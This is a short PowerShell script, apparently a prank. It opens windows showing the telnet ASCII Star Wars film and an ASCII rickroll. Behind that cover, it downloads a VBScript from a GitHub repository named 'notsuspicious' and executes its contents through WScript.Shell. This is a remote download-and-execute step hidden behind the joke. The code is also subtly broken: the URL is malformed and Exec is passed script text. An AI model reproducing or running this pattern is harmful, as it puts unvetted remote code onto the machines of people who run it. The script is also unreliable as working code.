
# Start Star Wars in a new Command Prompt window to the left
Start-Process cmd -ArgumentList "/c start telnet towel.blinkenlights.nl" -WindowStyle Normal
# Start rickroll in ASCII in a new Command Prompt window to the right
Start-Process cmd -ArgumentList "/c start cmd /k curl ascii.live/rick" -WindowStyle Normal

# Wait for a moment to let the windows start
# Define the URL of the VBScript
$vbsScriptUrl = "https://github/RaupenInspektor/notsuspicious/raw/main/script.vbs"

# Download the content of the VBScript
$vbsScriptContent = Invoke-WebRequest -Uri $vbsScriptUrl -UseBasicParsing | Select-Object -ExpandProperty Content

# Execute the VBScript content using the VBScript engine
$shell = New-Object -ComObject "WScript.Shell"
$shell.Exec($vbsScriptContent)


